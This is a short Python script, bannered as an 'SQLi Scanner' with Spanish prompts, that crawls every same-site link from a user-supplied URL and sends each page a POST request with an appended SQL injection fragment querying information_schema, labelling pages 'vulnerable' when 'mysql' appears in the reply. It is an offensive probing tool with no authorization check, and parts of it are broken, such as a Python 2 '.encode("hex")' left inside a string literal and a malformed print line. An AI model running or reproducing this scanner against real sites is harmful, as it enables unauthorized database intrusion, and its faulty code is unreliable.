from bs4 import BeautifulSoup
from urllib.parse import urldefrag, urljoin, urlparse
import mechanize
import requests

print ('''

 $$$$$$\   $$$$$$\  $$\       $$\        $$$$$$\                                                             
$$  __$$\ $$  __$$\ $$ |      \__|      $$  __$$\                                                            
$$ /  \__|$$ /  $$ |$$ |      $$\       $$ /  \__| $$$$$$$\ $$$$$$\  $$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$ |      $$ |      \$$$$$$\  $$  _____|\____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |      $$ |       \____$$\ $$ /      $$$$$$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
$$\   $$ |$$ $$\$$ |$$ |      $$ |      $$\   $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
\$$$$$$  |\$$$$$$ / $$$$$$$$\ $$ |      \$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ |  $$ |$$ |  $$ |\$$$$$$$\ $$ |      
 \______/  \___$$$\ \________|\__|       \______/  \_______|\_______|\__|  \__|\__|  \__| \_______|\__|      
               \___|                                                                                         

Create Manuel Quevedo & Hernan Rodriguez''')  
url = input('Ingrese URL: ')
br = mechanize.Browser()

urls = [url]
visited = [url]
initial = '+FROM+information_schema.columns+WHERE+table_schema!=0x"+"information_schema".encode("hex")'

while len(urls)>0:
    try:
        br.open(urls[0])
        urls.pop(0)
        for link in br.links():
            newurl =  urljoin(link.base_url,link.url)
            if newurl not in visited and url in newurl:
                visited.append(newurl)
                urls.append(newurl)
                print (newurl)
                first = requests.post(newurl+initial)
                if 'mysql' in first.text:
                		print (first)+('vulnerable')
    except:
        urls.pop(0)
